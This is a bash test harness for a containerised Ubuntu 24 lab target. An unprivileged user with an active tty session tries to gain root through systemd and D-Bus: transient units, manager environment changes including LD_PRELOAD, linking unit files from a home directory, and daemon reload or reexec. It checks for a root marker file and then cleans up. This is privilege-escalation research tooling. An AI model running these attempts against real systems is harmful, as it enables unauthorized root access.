#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/active-systemd-transient.out"
tmp_log="$(mktemp "$repo_dir/logs/active-systemd-transient.out.tmp.XXXXXX")"

mkdir -p "$repo_dir/logs"

docker exec -i "$container" bash -s >"$tmp_log" 2>&1 <<'TARGET'
set +e

WORK=/tmp/active-systemd-transient
USER=selfauth
USER_HOME=/home/selfauth
USER_DIR=$USER_HOME/active-systemd-transient
USER_PROBE=$USER_DIR/probe.sh
DBUS_PROBE=$USER_DIR/dbus_transient_probe.py
USER_OUT=$WORK/user.out
MARKER=/root/active_systemd_transient_root
TMP_MARKER=/tmp/active_systemd_transient_root
PROFILE=$USER_HOME/.bash_profile
PROFILE_BAK=$WORK/selfauth.bash_profile.bak
PROFILE_STATE=$WORK/selfauth.bash_profile.state

section() {
  printf '\n## %s\n' "$1"
}

run_root() {
  local label="$1"
  shift
  section "$label"
  printf '$ %s\n' "$*"
  timeout 12 "$@"
  printf 'rc=%s\n' "$?"
}

cleanup_target() {
  set +e
  loginctl terminate-user "$USER" >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  systemctl unset-environment ACTIVE_SYSTEMD_TRANSIENT LD_PRELOAD ROOT_MARKER_ENV >/dev/null 2>&1 || true
  for unit in \
    active-systemd-transient-run.service \
    active-systemd-transient-run-env.service \
    active-systemd-transient-run-workdir.service \
    active-systemd-transient-run-rootimage.service \
    active-systemd-transient-run-user.service \
    active-systemd-transient-dbus-basic.service \
    active-systemd-transient-dbus-env.service \
    active-systemd-transient-dbus-workdir.service \
    active-systemd-transient-dbus-rootimage.service \
    active-systemd-transient-dbus-user.service \
    active-systemd-transient-linked.service \
    active-systemd-transient-path.service; do
    systemctl stop "$unit" >/dev/null 2>&1 || true
    systemctl disable "$unit" >/dev/null 2>&1 || true
    systemctl reset-failed "$unit" >/dev/null 2>&1 || true
  done
  rm -f \
    /etc/systemd/system/active-systemd-transient-linked.service \
    /etc/systemd/system/active-systemd-transient-path.service \
    /run/systemd/system/active-systemd-transient-linked.service \
    /run/systemd/system/active-systemd-transient-path.service \
    "$MARKER" "$TMP_MARKER"
  rm -rf "$USER_DIR" "$WORK"
  systemctl daemon-reload >/dev/null 2>&1 || true
}

mkdir -p "$WORK"
chmod 0755 "$WORK"
rm -f "$MARKER" "$TMP_MARKER"

section "target identity and package versions"
{
  sed -n '1,8p' /etc/os-release
  uname -a
  systemctl --version | sed -n '1,3p'
  dbus-daemon --version | sed -n '1,2p'
  pkaction --version 2>&1 || true
  id attacker 2>&1 || true
  id "$USER" 2>&1 || true
  groups "$USER" 2>&1 || true
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    systemd systemd-sysv libsystemd0 dbus dbus-bin dbus-daemon dbus-user-session \
    libpam-systemd policykit-1 polkitd libpolkit-agent-1-0 libpolkit-gobject-1-0 \
    util-linux login passwd 2>&1 | sort
}

section "default systemd policy and D-Bus config snippets"
{
  echo "### /usr/share/polkit-1/actions/org.freedesktop.systemd1.policy"
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.systemd1.policy | sed -n '21,83p'
  echo
  echo "### pkaction verbose systemd1 actions"
  for action in \
    org.freedesktop.systemd1.manage-units \
    org.freedesktop.systemd1.manage-unit-files \
    org.freedesktop.systemd1.set-environment \
    org.freedesktop.systemd1.reload-daemon; do
    echo "--- $action"
    pkaction --verbose --action-id "$action" 2>&1 | sed -n '1,80p'
  done
  echo
  echo "### /usr/share/dbus-1/system.d/org.freedesktop.systemd1.conf readable/mutating method gates"
  nl -ba /usr/share/dbus-1/system.d/org.freedesktop.systemd1.conf | sed -n '18,38p'
  nl -ba /usr/share/dbus-1/system.d/org.freedesktop.systemd1.conf | sed -n '203,340p'
  echo
  echo "### local polkit rule overrides mentioning systemd1"
  grep -RHE 'systemd1|manage-units|manage-unit-files|set-environment|reload-daemon' \
    /etc/polkit-1/rules.d /usr/share/polkit-1/rules.d 2>/dev/null || true
}

section "default system manager and unit path state"
{
  busctl --system status org.freedesktop.systemd1 2>&1 | sed -n '1,80p'
  busctl introspect --system org.freedesktop.systemd1 /org/freedesktop/systemd1 \
    org.freedesktop.systemd1.Manager --no-pager 2>&1 |
    egrep 'StartTransientUnit|SetEnvironment|UnsetEnvironment|UnsetAndSetEnvironment|LinkUnitFiles|EnableUnitFiles|Reload |Reexecute|StartUnit|SetUnitProperties|BindMountUnit|MountImageUnit|Environment'
  echo
  systemctl show-environment 2>&1 | sort
  echo
  for p in /etc/systemd/system /run/systemd/system /usr/lib/systemd/system /usr/local/lib/systemd/system /etc/systemd/system.conf /etc/systemd/system.conf.d /run/systemd/system.conf.d; do
    stat -Lc '%A %U:%G %n' "$p" 2>&1 || true
  done
  echo
  find /etc/systemd/system /run/systemd/system -maxdepth 2 \
    \( -name 'active-systemd-transient*' -o -name '*transient*' \) \
    -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
}

if ! id "$USER" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$USER"
fi
echo "$USER:$USER" | chpasswd
usermod -G "$USER" "$USER"
mkdir -p "$USER_DIR"
chown -R "$USER:$USER" "$USER_DIR"
touch "$USER_OUT"
chown "$USER:$USER" "$USER_OUT"

cat >"$USER_DIR/active-systemd-transient-linked.service" <<'UNIT'
[Unit]
Description=active systemd transient linked root marker

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/active_systemd_transient_root'
UNIT
cat >"$USER_DIR/active-systemd-transient-path.service" <<'UNIT'
[Unit]
Description=active systemd transient path trick root marker

[Service]
Type=oneshot
WorkingDirectory=/home/selfauth/active-systemd-transient
Environment=ACTIVE_SYSTEMD_TRANSIENT=/root/active_systemd_transient_root
ExecStart=/bin/sh -c 'id > "$ACTIVE_SYSTEMD_TRANSIENT"'
UNIT
ln -sf "$USER_DIR/active-systemd-transient-linked.service" "$USER_DIR/symlink-to-linked.service"
truncate -s 8M "$USER_DIR/rootimage.raw"
chown -R "$USER:$USER" "$USER_DIR"

cat >"$DBUS_PROBE" <<'PY'
#!/usr/bin/env python3
import os
import subprocess
import dbus

MARKER = "/root/active_systemd_transient_root"
USER_DIR = "/home/selfauth/active-systemd-transient"
BUS = dbus.SystemBus()
MGR = dbus.Interface(
    BUS.get_object("org.freedesktop.systemd1", "/org/freedesktop/systemd1"),
    "org.freedesktop.systemd1.Manager",
)

def shquote(argv):
    return " ".join("'" + a.replace("'", "'\\''") + "'" for a in argv)

def prop(name, value):
    return dbus.Struct((dbus.String(name), value), signature=None)

def exec_prop(argv):
    return prop(
        "ExecStart",
        dbus.Array(
            [
                dbus.Struct(
                    (
                        dbus.String(argv[0]),
                        dbus.Array([dbus.String(a) for a in argv], signature="s"),
                        dbus.Boolean(False),
                    ),
                    signature=None,
                )
            ],
            signature="(sasb)",
            variant_level=1,
        ),
    )

def base_props(argv):
    return [
        prop("Description", dbus.String("active systemd transient dbus probe", variant_level=1)),
        prop("Type", dbus.String("oneshot", variant_level=1)),
        exec_prop(argv),
    ]

def call(label, printable, fn):
    print(f"\n### {label}")
    print(f"$ {printable}")
    try:
        res = fn()
        print(f"RESULT {repr(res)}")
        print("rc=0")
    except Exception as exc:
        print(f"EXC {type(exc).__name__}: {exc}")
        print("rc=1")

def start_transient(label, unit, argv, extras):
    props = base_props(argv) + extras
    aux = dbus.Array([], signature="(sa(sv))")
    printable = (
        "dbus StartTransientUnit "
        f"unit={unit} mode=replace ExecStart={shquote(argv)} "
        + " ".join(f"{k}={v}" for k, v in extras_printable(extras))
    )
    call(label, printable, lambda: MGR.StartTransientUnit(
        unit,
        "replace",
        dbus.Array(props, signature="(sv)"),
        aux,
        timeout=5,
    ))

def extras_printable(extras):
    out = []
    for item in extras:
        name = str(item[0])
        val = item[1]
        if isinstance(val, dbus.Array):
            out.append((name, "[" + ",".join(map(str, val)) + "]"))
        else:
            out.append((name, str(val)))
    return out

marker_cmd = ["/bin/sh", "-c", f"id > {MARKER}"]
start_transient("StartTransientUnit ExecStart root marker", "active-systemd-transient-dbus-basic.service", marker_cmd, [])
start_transient(
    "StartTransientUnit with Environment",
    "active-systemd-transient-dbus-env.service",
    ["/bin/sh", "-c", 'id > "$ACTIVE_SYSTEMD_TRANSIENT"'],
    [prop("Environment", dbus.Array(["ACTIVE_SYSTEMD_TRANSIENT=" + MARKER, "ROOT_MARKER_ENV=" + MARKER], signature="s", variant_level=1))],
)
start_transient(
    "StartTransientUnit with WorkingDirectory",
    "active-systemd-transient-dbus-workdir.service",
    marker_cmd,
    [prop("WorkingDirectory", dbus.String(USER_DIR, variant_level=1))],
)
start_transient(
    "StartTransientUnit with RootImage user file",
    "active-systemd-transient-dbus-rootimage.service",
    marker_cmd,
    [prop("RootImage", dbus.String(USER_DIR + "/rootimage.raw", variant_level=1))],
)
start_transient(
    "StartTransientUnit with User=root",
    "active-systemd-transient-dbus-user.service",
    marker_cmd,
    [prop("User", dbus.String("root", variant_level=1))],
)

call("SetEnvironment root marker", "dbus Manager.SetEnvironment ['ACTIVE_SYSTEMD_TRANSIENT=/root/active_systemd_transient_root']", lambda: MGR.SetEnvironment(["ACTIVE_SYSTEMD_TRANSIENT=" + MARKER], timeout=5))
call("UnsetEnvironment", "dbus Manager.UnsetEnvironment ['ACTIVE_SYSTEMD_TRANSIENT']", lambda: MGR.UnsetEnvironment(["ACTIVE_SYSTEMD_TRANSIENT"], timeout=5))
call("UnsetAndSetEnvironment", "dbus Manager.UnsetAndSetEnvironment ['PATH'] ['PATH=/tmp:/usr/bin']", lambda: MGR.UnsetAndSetEnvironment(["PATH"], ["PATH=/tmp:/usr/bin"], timeout=5))
call("LinkUnitFiles user unit", "dbus Manager.LinkUnitFiles ['/home/selfauth/active-systemd-transient/active-systemd-transient-linked.service'] false true", lambda: MGR.LinkUnitFiles([USER_DIR + "/active-systemd-transient-linked.service"], False, True, timeout=5))
call("LinkUnitFiles symlink unit", "dbus Manager.LinkUnitFiles ['/home/selfauth/active-systemd-transient/symlink-to-linked.service'] false true", lambda: MGR.LinkUnitFiles([USER_DIR + "/symlink-to-linked.service"], False, True, timeout=5))
call("EnableUnitFiles absolute user path", "dbus Manager.EnableUnitFiles ['/home/selfauth/active-systemd-transient/active-systemd-transient-path.service'] false true", lambda: MGR.EnableUnitFiles([USER_DIR + "/active-systemd-transient-path.service"], False, True, timeout=5))
call("StartUnit linked unit", "dbus Manager.StartUnit 'active-systemd-transient-linked.service' replace", lambda: MGR.StartUnit("active-systemd-transient-linked.service", "replace", timeout=5))
call("StartUnit isolate default target", "dbus Manager.StartUnit 'default.target' isolate", lambda: MGR.StartUnit("default.target", "isolate", timeout=5))
call("SetUnitProperties on root service", "dbus Manager.SetUnitProperties ssh.service runtime=false Environment=[...]", lambda: MGR.SetUnitProperties("ssh.service", False, dbus.Array([prop("Environment", dbus.Array(["ACTIVE_SYSTEMD_TRANSIENT=" + MARKER], signature="s", variant_level=1))], signature="(sv)"), timeout=5))
call("Reload manager", "dbus Manager.Reload", lambda: MGR.Reload(timeout=5))
call("Reexecute manager", "dbus Manager.Reexecute", lambda: MGR.Reexecute(timeout=5))
PY
chmod 0755 "$DBUS_PROBE"
chown "$USER:$USER" "$DBUS_PROBE"

cat >"$USER_PROBE" <<'SH'
#!/usr/bin/env bash
set +e
OUT=/tmp/active-systemd-transient/user.out
MARKER=/root/active_systemd_transient_root
USER_DIR=/home/selfauth/active-systemd-transient
exec >"$OUT" 2>&1

section() {
  printf '\n## %s\n' "$1"
}

run_cmd() {
  local label="$1"
  local cmd="$2"
  local timeout_s="${3:-10}"
  printf '\n### %s\n$ %s\n' "$label" "$cmd"
  timeout "$timeout_s" bash -c "$cmd"
  local rc=$?
  printf 'rc=%s\n' "$rc"
}

section "active selfauth tty session proof"
id
groups
tty
printf 'XDG_SESSION_ID=%s\n' "${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" -p Id -p Name -p User -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote -p Leader 2>&1
fi
loginctl --no-pager list-sessions 2>&1 || true
passwd -S selfauth 2>&1 || true

section "active selfauth polkit authorization checks"
python3 - <<'PY'
import dbus
bus = dbus.SystemBus()
pol = bus.get_object("org.freedesktop.PolicyKit1", "/org/freedesktop/PolicyKit1/Authority")
auth = dbus.Interface(pol, "org.freedesktop.PolicyKit1.Authority")
subj = ("system-bus-name", {"name": dbus.String(bus.get_unique_name(), variant_level=1)})
for action in [
    "org.freedesktop.systemd1.manage-units",
    "org.freedesktop.systemd1.manage-unit-files",
    "org.freedesktop.systemd1.set-environment",
    "org.freedesktop.systemd1.reload-daemon",
]:
    try:
        res = auth.CheckAuthorization(subj, action, {}, 0, "", timeout=5)
        print(f"CanAuthorize {action} -> authorized={int(res[0])} challenged={int(res[1])} details={dict(res[2])}")
    except Exception as exc:
        print(f"CanAuthorize ERR {action}: {type(exc).__name__}: {exc}")
PY
for action in \
  org.freedesktop.systemd1.manage-units \
  org.freedesktop.systemd1.manage-unit-files \
  org.freedesktop.systemd1.set-environment \
  org.freedesktop.systemd1.reload-daemon; do
  run_cmd "pkcheck $action no-interaction" "pkcheck --action-id '$action' --process \$\$" 4
done

section "systemd-run --system transient root execution attempts"
run_cmd "systemd-run basic root marker" "systemd-run --system --unit=active-systemd-transient-run --collect --wait --property=Type=oneshot /bin/sh -c 'id > $MARKER'" 12
run_cmd "systemd-run Environment root marker" "systemd-run --system --unit=active-systemd-transient-run-env --collect --wait --property=Type=oneshot --property=Environment=ACTIVE_SYSTEMD_TRANSIENT=$MARKER /bin/sh -c 'id > \"\$ACTIVE_SYSTEMD_TRANSIENT\"'" 12
run_cmd "systemd-run WorkingDirectory" "systemd-run --system --unit=active-systemd-transient-run-workdir --collect --wait --property=Type=oneshot --property=WorkingDirectory=$USER_DIR /bin/sh -c 'pwd; id > $MARKER'" 12
run_cmd "systemd-run RootImage user file" "systemd-run --system --unit=active-systemd-transient-run-rootimage --collect --wait --property=Type=oneshot --property=RootImage=$USER_DIR/rootimage.raw /bin/sh -c 'id > $MARKER'" 12
run_cmd "systemd-run User=root" "systemd-run --system --unit=active-systemd-transient-run-user --collect --wait --property=Type=oneshot --property=User=root /bin/sh -c 'id > $MARKER'" 12

section "direct D-Bus StartTransientUnit and manager method attempts"
python3 "$USER_DIR/dbus_transient_probe.py"

section "systemctl unit file, reload, reexec, and isolate attempts"
run_cmd "systemctl link user service" "systemctl --system --no-ask-password link '$USER_DIR/active-systemd-transient-linked.service'" 10
run_cmd "systemctl enable linked service" "systemctl --system --no-ask-password enable active-systemd-transient-linked.service" 10
run_cmd "systemctl start linked service" "systemctl --system --no-ask-password start active-systemd-transient-linked.service" 10
run_cmd "systemctl link path trick service" "systemctl --system --no-ask-password link '/tmp/../home/selfauth/active-systemd-transient/active-systemd-transient-path.service'" 10
run_cmd "systemctl enable absolute path service" "systemctl --system --no-ask-password enable '$USER_DIR/active-systemd-transient-path.service'" 10
run_cmd "systemctl start path service" "systemctl --system --no-ask-password start active-systemd-transient-path.service" 10
run_cmd "systemctl set-environment" "systemctl --system --no-ask-password set-environment ACTIVE_SYSTEMD_TRANSIENT=$MARKER LD_PRELOAD=$USER_DIR/notreal.so" 10
run_cmd "systemctl unset-environment" "systemctl --system --no-ask-password unset-environment ACTIVE_SYSTEMD_TRANSIENT LD_PRELOAD" 10
run_cmd "systemctl daemon-reload" "systemctl --system --no-ask-password daemon-reload" 10
run_cmd "systemctl daemon-reexec" "systemctl --system --no-ask-password daemon-reexec" 10
run_cmd "systemctl isolate default.target" "systemctl --system --no-ask-password isolate default.target" 10

section "active selfauth marker and root-write checks"
ls -l "$MARKER" /tmp/active_systemd_transient_root 2>&1 || true
systemctl show-environment 2>&1 | grep -E 'ACTIVE_SYSTEMD_TRANSIENT|ROOT_MARKER_ENV|LD_PRELOAD' || true
find /etc/systemd/system /run/systemd/system -maxdepth 2 \
  \( -name 'active-systemd-transient*' -o -lname '*active-systemd-transient*' \) \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
exit
SH
chmod 0755 "$USER_PROBE"
chown "$USER:$USER" "$USER_PROBE"

if [ -e "$PROFILE" ]; then
  cp -a "$PROFILE" "$PROFILE_BAK"
  echo present >"$PROFILE_STATE"
else
  echo absent >"$PROFILE_STATE"
fi
cat >"$PROFILE" <<SH
$USER_PROBE
exit
SH
chown "$USER:$USER" "$PROFILE"

section "openvt active selfauth execution"
if command -v openvt >/dev/null 2>&1 && [ -e /dev/tty1 ]; then
  systemctl stop getty@tty1.service >/dev/null 2>&1 || true
  timeout 420 openvt -c 1 -s -f -w -- /bin/login -f "$USER" 2>&1
  echo "openvt_rc=$?"
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  loginctl terminate-user "$USER" >/dev/null 2>&1 || true
else
  echo "openvt or /dev/tty1 unavailable; active selfauth branch skipped"
fi

if grep -qx present "$PROFILE_STATE" 2>/dev/null; then
  cp -a "$PROFILE_BAK" "$PROFILE"
else
  rm -f "$PROFILE"
fi

section "active selfauth output"
cat "$USER_OUT" 2>&1 || true

section "post-trigger root proof and system state"
{
  echo "### marker proof"
  ls -l "$MARKER" "$TMP_MARKER" 2>&1 || true
  if [ -e "$MARKER" ]; then
    echo "--- marker contents"
    sed -n '1,20p' "$MARKER" 2>&1 || true
  fi
  echo
  echo "### manager environment marker"
  systemctl show-environment 2>&1 | grep -E 'ACTIVE_SYSTEMD_TRANSIENT|ROOT_MARKER_ENV|LD_PRELOAD' || true
  echo
  echo "### root unit file writes"
  find /etc/systemd/system /run/systemd/system -maxdepth 2 \
    \( -name 'active-systemd-transient*' -o -lname '*active-systemd-transient*' \) \
    -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
  echo
  echo "### unit states"
  systemctl list-units 'active-systemd-transient*' --all --no-pager 2>&1 || true
  systemctl list-unit-files 'active-systemd-transient*' --no-pager 2>&1 || true
  echo
  echo "### failed units"
  systemctl --failed --no-legend 2>&1 || true
  echo
  echo "### system health"
  systemctl is-system-running 2>&1 || true
}

section "cleanup"
cleanup_target
{
  echo "marker_after_cleanup:"
  ls -l "$MARKER" "$TMP_MARKER" 2>&1 || true
  echo
  echo "manager_env_after_cleanup:"
  systemctl show-environment 2>&1 | grep -E 'ACTIVE_SYSTEMD_TRANSIENT|ROOT_MARKER_ENV|LD_PRELOAD' || true
  echo
  echo "unit_files_after_cleanup:"
  find /etc/systemd/system /run/systemd/system -maxdepth 2 \
    \( -name 'active-systemd-transient*' -o -lname '*active-systemd-transient*' \) \
    -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
  echo
  echo "system_health_after_cleanup:"
  systemctl is-system-running 2>&1 || true
  systemctl --failed --no-legend 2>&1 || true
}

exit 0
TARGET

mv "$tmp_log" "$log_path"
sed -n '1,520p' "$log_path"
